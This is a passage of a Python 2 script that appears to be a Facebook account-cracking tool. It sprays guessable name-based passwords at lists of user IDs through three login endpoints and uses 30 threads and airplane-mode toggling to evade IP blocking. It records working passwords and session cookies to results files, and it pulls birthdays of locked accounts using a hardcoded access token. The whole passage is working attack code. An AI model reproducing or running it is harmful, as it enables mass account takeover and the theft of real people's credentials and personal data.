            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] IP terblokir hidupkan mode pesawat 5 detik'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* RIAZ-OK--> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/RIAZ-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* CHECKPOINT--> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* CHECKPOINT--> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> RIAZ-OK-:%s - RIAZ-CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* RIAZ-OK--> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/RIAZ-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* CHECKPOINT--> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* CHECKPOINT--> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> RIAZ-OK-:%s - RIAZ-CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* RIAZ-OK--> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/RIAZ-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* CHECKPOINT--> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* CHECKPOINT--> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/RIAZ-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] dont be empty bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(N,H)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] RIAZ-OK results are saved to -> results/RIAZ-OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] RIAZ-CP results are saved to -> results/RIAZ-CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] TURN ON OFF(FILGHT)MOD ONLY 5 SEC EVERY 10 MUNTINS\n'%(N,H)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] correct input'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
